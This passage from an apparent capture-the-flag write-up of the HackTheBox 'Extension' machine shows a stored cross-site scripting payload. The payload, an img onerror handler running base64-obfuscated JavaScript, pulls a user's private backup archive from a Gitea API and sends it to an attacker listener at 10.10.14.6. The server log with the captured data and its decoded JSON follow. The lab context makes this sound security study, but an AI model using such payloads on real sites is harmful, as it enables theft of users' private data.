<><img SRC=http://10.10.14.6/test.img onerror=eval.call`${"eval\x28atob`ZmV0Y2goImh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cy9iYWNrdXAudGFyLmd6IikudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS5qc29uKCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgiaHR0cDovLzEwLjEwLjE0LjYvIisgYnRvYShKU09OLnN0cmluZ2lmeShkYXRhKSkpKTsK`\x29"}` />

```

My visit returns the same error message as the previous. But when Extension visits there’s a lot of data:

```
10.10.10.224 - - [23/Jul/2022 23:28:22] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 23:28:22] "GET /test.img HTTP/1.1" 404 -
10.10.10.224 - - [23/Jul/2022 23:28:23] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 23:28:23] "GET /eyJuYW1lIjoiYmFja3VwLnRhci5neiIsInBhdGgiOiJiYWNrdXAudGFyLmd6Iiwic2hhIjoiYzI1Y2I5ZDFmMWQ4M2JkYWQ0MWRhZDQwMzg3NGMyYzliOTFkMGI1NyIsInR5cGUiOiJmaWxlIiwic2l6ZSI6NDMxNiwiZW5jb2RpbmciOiJiYXNlNjQiLCJjb250ZW50IjoiSDRzSUFOTzYxR0VBQSswNmFaZmFTSkwrT3ZvVnVlVjZYUzVqU2dnZFFQblZiZ3NROTMyRDdmV1RSQW9FdXRERnNaNzU3UnNwUVJYbG85Mzl4dTNlblNHZVhVaVprUkdSRVJtSE1uTnBtNWhXbDdKcjZKaCs4ZWRBQ2lERDgrU1h5ZkRNK2U4SlhqQWNJL0FNeTZjem1SY3BoazJ6NlJlSS81UGtlUWFCNThzdVFpK09PdmdtM3ZmNi81L0M4dHoraXF5dUE4ZjcwZXNnc24vbTk5a2ZMQS8yNXdTZXU5ai9aOEJYN1IvLzNvRmk3aGFIZjU0SE1iQWdjSC9BL3BrMEs3eEFxWCtlOWZmaFl2OG4rOTg1cnEzcHhvK2VaR1IvN3B2Mlp6Z3VFOW1mZ3djdWt5TCtuMGt4Ri92L0RIaUovdkZvOW51RWQxZ05mRHhIeWg3NVM0eFUyelJsYTQ1MHk4ZXU0Mkw0aXpUYlJZYTkwQzNrTGJGaGVIZlVTelJZNmg0aUpCRDhXcmFQWEN4SFJCVFpXNzVpYnQ4Z1hTT015T3ZISXpjRWRFNU5FVDJnZzNlNjUwY1VQWXdSSFhndTdZSGVNVDIzVlpwZzBuZ25tNDZCUFpxWXpRK2NKQ0hsUlVLZHVzaHdJbnpjQTZOQlhGVW1zd0taU1FjaGxBU0t5SUU0Snkvd0hYVWNNY2VhSEJnK0NrelpXNU9wZU5nbmcyanNxL1JSN0xjUkwrandkV3NSallxd2dVTFU3aTFqNVhnd1pRdGtOQXhFRktqYWxxWXZBcENGakRCMHhaSE5aTXptVVlpWDhYc3FuU2J5Z01MY3dMSUlFeUl2QmUvdlVOSkNWOWQ1c1YvNU9KSjYvV3E3ZFlVK3ZDVWtMUW9Cd0NoTE5ZSTVScEZhWFpWUTBmMmpXaU9VbUl3R1pDcnRwa1FmOFo3SS9PM3U4NjVvbUtaVDhDK3lpNDg2NHFDQ1BKdFFQdkx6VU9CaDk4WkRqcXVIb0dxa2dOYWU4WTc1emsvRW9SOTRvalBaQ2RHSHA5NzdhOUp3OVdPNTNwR0ZZSHlIK1JQU21ReC90WnYrYWZBOC9rZk9DTDdzMis3K3gvR0k0ai9rK0cvbWYzZys1djkwaE1md0dmaTV4UCtmQUY2QWpqT2oxRG42QitWczV4UUVzZVFhN3hmZ0hKcHV6U2x3SnY5ZjF3UCt2ZUVyL2cvNXl3NzhIOGpqTy9WZmltVzV6K28vbnVjdTlkOVBnWmZuTlJpWS9Ya05lQ3pmMEJZUzVYblJSL0lycWRNZ05jZGRXQTVQNVJDVU9wNE41WjBLalc3VTRxa3VCaVRmSm9rYktrTVB4eGxiM1ZOeGhyNjY3bGNhbzhZVmVrRE1zNElHa3ZjdUxnTWhIZE1SeFk4bitoL1FMNzk4cXkrNStaZE8yajhRbnZzL1JQNC9ZUk13MnYvNXJmei85UDJmNWhpT2ZQK2xCT2F5Ly9NejRFdjc2L09QcmlmL1NCN2ZxZi9ZTkpQNXpQNThtazlmNHYvUGdDU0J2RlN1dGxDdkw2Sk9yem9TQnhLcVM5T29oMnBXcTVMVHJlWkZzVjRRdTVLNFkvUGRETGNWbGtXMzZhNTRaV2ZoVFQvVTFWNTJ2QnJrUzNSZXFvN25oNW9UanZWRXpyYmFWS0MxaDBhcWt5aEt1YWtVOGt6RmFUYzJNM29XOUllN1EzTkVqN1YweCtZUzhzTEFqbGJPNzRTeUZraG0yaHhWY2p0MmtIV285cXc4RHIzTXB0bjBsbGxocE84Yld6MXNtaW1QYnMzSDJXcXFaZFZIWml0WEhLMjlXb01mdFJPSmpzcVZDK3Q4WmRPVmhveERqZmdTTGd3bnRMek1xb1pobGd2MG1MT2RsRHhxNXBvRDQxRGtwM21tMmg0NHM0V2RuWmVaZlRoeTl2M0tlSk1QeW5SbHdUVW9NVTBiRFN2VnpnOFphOFduUTI3dWJJTmFJdE5iNk9xaXZIQnIya3B3N1lwVTlPYmRrc2NIWVNyTXVQWlVzZXZXMm1yWUFsWFNEMmthZC8zQlNHRXlRa0pjOXVjTGp4MTJOcXVjbU9rdWRxTlVlU3BzcTBXeEsrWkZHNVRkTFN5WmxtQmxYYVdaWmNaNVNsclZ0OE5GV0V1SW90Z2NiTm1WbGZFRFIwZzM4bG1yaDJVejIyS1hXa0lmWlBGd2JTL0tkUzgvV1RXYkJVbXA5OWJsZ0JsUitWQktwNmY3b3QzcnBocTRBejR2OXBzTkx5TUYvV0ptWGMya0ttMjd0ZVFxL2ZxYVorc3VYMnNFOVhDZ2xGTkZjOTNqRllFNjlIcVZrajRlaExOTVk1U3dqTjRNMnp0K0pqV3lhc1hCcTNxZTMrYm5veG85RENzOWo1NkU0U3pNQ3JXU3ZGQVU3ZUJXQktwWU8zQzZKK1g2VW1tbldtTy9MbHFGUTRvdDJKMnNXVTBsK0xWUjdiQjhicmx1MTNmTWZLcjFEWlU3cU9wc00rVDN6RkFQS1YveVZja0s1WTR0OXZyQlRtU1hka3ZZcWt1ckhUYVVRNm1kN3JYNDBOL05jbFB6NEt2WWFMWXJqU0c0YkdEbEJHKzRHRkVzTzFrUFZoMUh0TXQ1c1ZPMVUwT3RPdUFtRTArdHQ5WjloeGxOWkQwbnNaWmRZYVQwUnRDcXFpcUdwdE1XMldwYUhHZDZGSll3MHk2eUNnNUVkOUZJOUVhbHJGMXJpOFhFY0QyMnNvVk9XcGxZMW9CaDVBelBqc3REcTFOMStXNnVhVEx1VEhVTHhUUWxsWGdobThQMS9vYkxRWkdWcnZaOTF0Z3IzS2k1RHBqeTVOQmxEM0pKYWxTenVCOE9XcFB1eW1sZ2Nad3ZSUkszR21OSzZhNjZoeXlUbUcrRE9iZHdLK1ZoQWFjYnVVVnFUZGROcTBiVDNWUkMwS3M1cWR3eWF3Mk4zMWVzcWJVSnErUHhwTyswUFkvcXNyTkJyVHdlVm1wMFdEVGN2aU1ITTZGVWErWW0zTFJSU3hlOWZxZWs3alRWOFJKVHhpNUxXVHZYelV3cW03M0VEZDJpM3FRcXJGRHdldVZPYTJ0dVc4MVdaYWpReG5vbE5hYjFRNy9FWjlYQlhNejBuRndZaWR5dU5SSWJkZHhZT282OTArM05Oa3hRNnRxZk9HMSt1dlltT1hiTk80MTBJQW5tZ1JuYW51cTBxNmF6Mm1XM0U4NFRPcDdYS0s1bTQ5RFBIMnFkakwzaHltc3pNQ2pSYUV6QW44TDllRmUxRDdKVUxYWTZwWFptbDZvZENvNjhaUGZXVGxSWFNpQVBPc1U4c3prb25ZN1ByUlJ2YTJaQ3RUUXVVUnMyd1V4SzVXem1rQzlJMDBTN2EvS2xiamZjZ2NpaVZwdXhUYzNZTE16VWdGV2R6SkNYWml0eDJPTXcwMG9zWmJ1WlVadFVJYXpuVExQanROWnRPZWpwdWpLZjZzeWdraTNQZVozSmwwV2FwcFhsWHMwZlV2MldSdFBiV3RIT2FJb2d6Tnh3Mko5MEI5UktWNGJhM2lrcGxWSUwxeVo0VEl2YUtyR1hSanRjYU0rMkNsUE1UZFZleHBMeTdiYXdyblhDNldFOW5nM1NadFBJeS9ySXBrd05JdFcwV1ZoTUpUR2QzOWpxS21XcWxtcjVhWk1wQ1czRllSMC96QnkySlRwdzFwbVVVUkFPYkdBenUwRmZzOHFkRGswMTVRbll5QnlXY3BQVzFqWktvOE5RNkErYUxzNTNldDV5bk92VkU2eXY3cktTc1Z0eCs0VGY3QllhbFVhNDJPK25jbGx4c3BUZUdXWkwzWUsvS2ptVittWTNUdTNteFdLb1ZZWjRhT3JkM21ERzJPeTZWaGRNbCswMnM3bEdyVUFibVlYNFFFVnBSV29WdjU1dS91cDArRzhIMzZyLzdweEErVkU4dnZmOUwzeFIvd2twL3JMLzkxT0E3UFdCdVJFVUZtS2ViUjNrQXJOWDB4SjVqY3NSYUJhN3hZcGFLb2FyNGtacWUvdWdZNFRsdWVEVUU3VmRaU2UzbXRJa0szV1hFRGhOTXljM01tbGRGZmdzRDVHTzVwb0RadEduclNGZWM0Rmo1VXkrTnFnMGQ1UGNqSjRtVml0K1V4Z0pSblphcWRpekJOZFg1TmxRWXl2enpuN05yMmR5NGhEWTIvMitjbkRHaldwWXFHZjNTaCtTSDZOc1Y5MjA2b3luYktvMTdtL1hvVEhNWkxqY1lUR3RkeVhzaUwzQjJKaXNSMXl0cCtVMmxkMStQSjVPR3psRjE2MmVNenlrZHUxSnMyTXNLc01GM3piTXdtcVhVaWIxM05pcVZlZXlYZWFVTEM0dXZLS1NHQVphbHlzTnhyaGp5ZlF5YlJVNEtMcktoZHBlbEF1ZWtlaHNnb1hhYmU4WWNYd3dCYnBQQjhGeUdTdzJ1SzhHSzN2YzZDZzV2c0MwUnVFa2RMbENxWll1SE9iZHhLYVRLdnFGWW1uU25hM2MwODdycjNqblk4dlRiZXZueDc4djkvOWM5VWZ6K0k3L1o5SVo5dlB6WHo1MU9mLy9LZkM0LytlcVg5LzZJNmVhbG0wbFB6L3kvWU1IdEsrT1o2L0gwODdITTlqYjQ4SHBhUmpaVXF4cThSbnk4Zmd6T255V1ZWOFBzYkYvZythMmRlUERYeVJiZTM4SkNKUktkaFN2azRBWWJScSsxbC9mb3Jkdm8yZDR1MFV1OWdQWGdoYnN5U3BoRUpOd0FpQVRPSVpPRG9lUm9Wc2dKam5iamg0aTZRbjNyZTR2a1FkaTQ5UHg4ZkY4akNpaGovRXpSWm0yaTVIdCtPREtIbFdwOWdlRmRtdlFhemNlOUlVRlhZcnRMd2wvMlhHd05TY2JvbWYwb3ZQcTAvVHNFTHRiVndlNWRKL3lsa0FTSmIwSU14NUxuYzZiaitmUUp4b0d0aFpFWHBDTHNPOVhaMUowL2t4ZVN0V0dGRFhBUEk1Q1V5ZWtCd1lja1RySGVraVRGbUNqTHJHNmpnVGQ2dGJjM2lKUFAyQWthK1F1QUpiVjVlTWxBZmdmbmZOYldNV2VKN3Y3TnpBNmNPWkV1MlI0S0JzQlViR0dHdFdXMUkva0tyUWJ3MmFyZi9jMHg0Z2RjQ0pjam9zQkp2bm11SGg4NEdxaHE5ZXZyOGpaYjNTaUw1UG1wU1diR0JhUkkwZHhsR3hDK3hCVlFXVERBQ0ttN0lPZzVERCtlQ2tBV0Ird2E2T1R6ZWE2aTFYUW9IN3M5QUxsckFsTS9TamZ3ckFWc2ppb2lPd2FGZzVNTmlhaUFhNDFOL2FQUGhPSm9GdGtvVVY4MzBTR0lRTWMzY0ZFLzg4M3VFODk4ZDQyQm9XaHErdFgvWXJVYUR4RUNPUjJ3UkhuOXVwME1CN0tyaTRyNU83RkhGdStydTBmZCtLWHJnMSt0TGNEdExYZE5WSFdxNVBXSW5XNnRnbVRVckJoYjIrUForVUg0UGcvYzZ6b3N2VXhIbitmL1B0VkxCQjB1L0ZkaUdjSXozYnNuL1U4WEw4QzMvcktrTnV6YzMwWmFiS2w3ay9TdkNLS1UyM0RkdCtnd0lxVXU4Vm9iY0hDZzkrcnJXejVWeWpxdjQwZC8rcDZJUFdhVnlmdmgxVHFtakdCVDYrVGFWNkljZU1oSDJNbUQzdnNuWVdEd0NKTEdIUVhHVTZPVVVGTk1YSzBwb202Q0dIZEFwc3NaUy9Xcit6SWltN28vaDRVQUJFR3o0R1lyV2trZko2dWtvQ1BrMWcyQi84a01TeStNT0poOXo2K29tS3JnUmN2NGtmcXNaY1I1U3p0d0lCWURCRWx0cGNkK0dRcGdRTWRYUTRXRkNGdW41dVRlZ21UVVBISHorZExuZDBnK1JMaitUMlNHUE5zWVVaOG96VVFQWUhaWkEweDZEOS9BYk9HdEJVWXh1bjZ5RXMwaG9nbWh6aldJamdTZlB1Ny9sc2tlMTVna25CMjR4SHhJZXlDSmVQb0txbW1uT1N5WlBDcmFyOU5WNlZDVXVEU3Vkczc5S29CK1lMTTJBdkFnWS9FeU0wYzhDd1htNUFRa0F2cDU4M1JhZFVsSVFJV0pBdGpHNm5QUDBiYTAxaVFYWU14SUMwNW5KS3RlREozdDlUZnZ0QVlVUVUyUFB4WjEvbUZtT1B4MVhOVlBpQVkvVXloblQ3emNQTzVYeVZlWFQ5M2lyKy9mL2MreGJMdlVzeGJObTIrLy9BKytQWDk4dFNXZ29iN013U09JR3pQZTk5Zm94c3FrdmVQc0NRODdvRVFHUXd6Q2l6aWsrZnpRVit1bG1OYzlzbXRMNTBFek5qckluZU9QRVgzSVJ5QjBzbEsvM1ZwZS80OVJOTXYzRFVhOVBxVHV3djkxN2VQUWwvQm5QQ0gxTnZmS3pzQzRlWDNINjVoYkh4WENUejdTTzdNeDdFVmhjaG5pNUtzS3lPTzk3TGhRVUV4bjhQU3RlWjdlTlZCMXRQOW9UTkhnR2xFSko2YjE4ZWVUMklqbEZKUENHY1IvS2t4cVR4RHVyMUNuejU5RmUwMm5rc2tDQWo1Y0FPQ0p1T3c5aUFIdm4wVFgvaUsrMkhnd3czOCtUWkdHS0dFWCtLY2NWbTQySG00SVgrL1FpZEcwV0ljN1RlUmNJeUV2NElVUi8xVGZDMFhDbWdydTZUSWk2MkFYUmRtVDcyRVBFN01BLzBmb1VCbzkvcEFqWFE5a0lYUDNCL0hSRy84UFVSQUhEMEs5eXFFQWo5NlR0OGJKTFRDOC8wbWlCRnVvb1FEbnp0eHNpYUdQMXI1cUdRalZySnNsRzVPVFhMY0pENDJ4TytGVWtSTW5KT2lCMTNKQm5iQjdZOHFpcTVIUWdZK2xhK25XSDJIME5BamRTYlVESjU5RCtNUjhnd01PbUpTRUI0SmpTT1g2UG5oQmlZR3lUenBrUUNXVEFidUFrT2FmSUJjalpJNldTN3YwUFYvUWF4Skhhc0ZkV2svSlJHeXFraERwRFpZWllCK0xCRS8rYkp1UUJwZ1BwRktJSW5SemZ1Ykc0Lys3L2ZlNjNlcFpPN0Qrd1E4MGZSYmozNzM5cGRQSCtBbEV1ZWFwZ25pN1ZVODgzalpZVTIzOUtqWUpjWHdGT29NVTk0amtxS0o4NU5NUVVvdXFEOWM0bHN4SmlubndkVWdWaml5UzByRDZDNG8wUXIxZEJmaGFKbjREaVc1U2dxZVNpakVoWTJKSUhpZmFqYmpzUkQveXRjSStjSjQvQ0w1amV1ZnAxdVJuL0YvNXVSM24vY2VWL014c2tCa1hMZ3ltRG9PTTRRam1TL1NzQXkxQWZrQ0luVllYTjFiR0VjNUtSNGFYVDdWdlRmeDFjVWJZbjl5ZlhaLzdKNC8za0FsekU4WE80bTduRjlMamRaMkFJSGErd0wzOW83TTd6L1FzWVMxTjhpeFBYMzNPTFhUNU0vMEY2bm9hUkxSKzhlelNUM1h5KzhmU0pHRStzanZKT2R2VVA0S0NuVkt2bi8xcC9NRkxuQ0JDMXpnQWhlNHdBVXVjSUVMWE9BQ0Y3akFCUzV3Z1F0YzRBSVh1TUFGTHZCL0R2NFhvY29HQ1FCUUFBQT0iLCJ0YXJnZXQiOm51bGwsInVybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cy9iYWNrdXAudGFyLmd6P3JlZj1tYXN0ZXIiLCJodG1sX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvY2hhcmxpZS9iYWNrdXBzL3NyYy9icmFuY2gvbWFzdGVyL2JhY2t1cC50YXIuZ3oiLCJnaXRfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi9hcGkvdjEvcmVwb3MvY2hhcmxpZS9iYWNrdXBzL2dpdC9ibG9icy9jMjVjYjlkMWYxZDgzYmRhZDQxZGFkNDAzODc0YzJjOWI5MWQwYjU3IiwiZG93bmxvYWRfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi9jaGFybGllL2JhY2t1cHMvcmF3L2JyYW5jaC9tYXN0ZXIvYmFja3VwLnRhci5neiIsInN1Ym1vZHVsZV9naXRfdXJsIjpudWxsLCJfbGlua3MiOnsic2VsZiI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cy9iYWNrdXAudGFyLmd6P3JlZj1tYXN0ZXIiLCJnaXQiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2FwaS92MS9yZXBvcy9jaGFybGllL2JhY2t1cHMvZ2l0L2Jsb2JzL2MyNWNiOWQxZjFkODNiZGFkNDFkYWQ0MDM4NzRjMmM5YjkxZDBiNTciLCJodG1sIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi9jaGFybGllL2JhY2t1cHMvc3JjL2JyYW5jaC9tYXN0ZXIvYmFja3VwLnRhci5neiJ9fQ== HTTP/1.1" 404 -

```

Printing that into `base64 -d` and then `jq .` returns this JSON:

```

{
  "name": "backup.tar.gz",
  "path": "backup.tar.gz",
  "sha": "c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
  "type": "file",
  "size": 4316,
  "encoding": "base64",
  "content": "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",
  "target": null,
  "url": "http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master",
  "html_url": "http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz",
  "git_url": "http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
  "download_url": "http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz",
  "submodule_git_url": null,
  "_links": {
    "self": "http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master",
    "git": "http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
